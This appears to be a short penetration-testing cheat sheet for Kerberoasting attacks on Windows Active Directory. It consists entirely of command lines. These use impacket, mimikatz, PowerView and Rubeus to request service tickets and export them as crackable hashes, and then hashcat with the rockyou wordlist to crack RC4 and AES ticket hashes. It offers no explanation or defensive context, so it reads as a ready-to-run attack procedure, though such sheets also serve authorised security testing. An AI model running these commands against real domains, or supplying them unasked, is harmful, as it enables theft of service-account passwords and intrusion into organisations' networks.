### Linux
```
impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER> -request-user <USER> -outputfile <FILENAME>
```
### Windows - mimikatz
```
base64 /out:true
kerberos::list /export
echo "<BASE64_BLOB>" |  tr -d \\n
cat <ENCODED_FILE> | base64 -d > <USER>.kirbi
kirbi2john.py <USER>.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > <HASH_FILE>
```
### Windows - PowerView
```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<FILE>.csv -NoTypeInformation
```
### Windows - Rubeus
```
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:<USER> /nowrap /tgtdeleg
```
### Cracking
```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```